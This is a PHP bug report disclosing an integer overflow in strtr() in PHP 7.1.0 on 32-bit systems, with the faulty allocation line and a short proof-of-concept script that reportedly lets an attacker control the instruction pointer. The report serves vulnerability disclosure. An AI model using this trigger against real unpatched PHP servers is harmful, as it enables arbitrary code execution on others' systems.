## Original Report

Description
------------------

An integer overflow vulnerability exists in PHP-7.1.0
due to missing check of size before calling
zend_string_alloc() in ext/standard/string.c:3234.

Code:
new_str = zend_string_alloc(count * (str_len - needle_len) + ZSTR_LEN(haystack), 0);

All variables including str_len, needle_len, count, haystack are fully controllable.
The overflow results as arbitrary code execution,
as running of test script alter %eip to the arbitrary values.

This bug is only triggered in 32bit machine.

Test script
-------------------
<?php
   $a = str_repeat('A', 65536);
   $b = str_repeat('ABCD', 32768);
   // Changing 'ABCD' into other value alters %eip to arbitrary value.
   $c = array('AA'=> $b);
   strtr($a , $c);
?>

Expected result
------------------------
Correct execution of strtr() function.

Actual result
--------------------
